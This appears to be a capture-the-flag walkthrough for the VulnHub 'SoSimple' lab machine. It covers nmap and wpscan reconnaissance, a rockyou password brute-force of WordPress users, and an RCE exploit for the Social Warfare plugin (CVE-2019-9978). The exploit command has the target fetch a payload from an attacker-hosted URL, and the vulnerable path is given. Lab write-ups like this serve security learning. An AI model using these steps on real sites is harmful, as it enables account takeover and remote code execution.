Download the SoSimple VM from: https://www.vulnhub.com/entry/so-simple-1,515/

Running Nmap: nmap -p- -sV -sC 192.168.101.58

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Running dirb: dirb http://192.168.101.58

Running wpscan: wpscan --url http://192.168.101.58/wordpress/ --api-token [yourapitokenhere] --enumerate p,u
You'll need to register to https://wpscan.com/api to get your api-token.

The wpscan found user admin by Author Pattern.
Also found few Critical Vulnerabilities. Now Let's try bruteforcing the password.

sudo wpscan --url http://192.168.101.58/wordpress/ -U admin,max -P /usr/share/wordlists/rockyou.txt                         

Found password for max and logged into the admin panel. Nothing much here.
Check the exploits for outdated plugin: searchsploit social warfare
Found an exploit for the plugin with RCE
use the exploit (cve-2019-9978.py) with command: python2 cve-2019-9978.py --target http://192.168.101.58/wordpress/ --payload-uri http://192.168.211.128:8000/payload.txt
Exploit GithubLink: https://github.com/hash3liZer/CVE-2019-9978

if the exploit doesnt work then open the exploit and copy the vuln path: http://192.168.101.58/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s
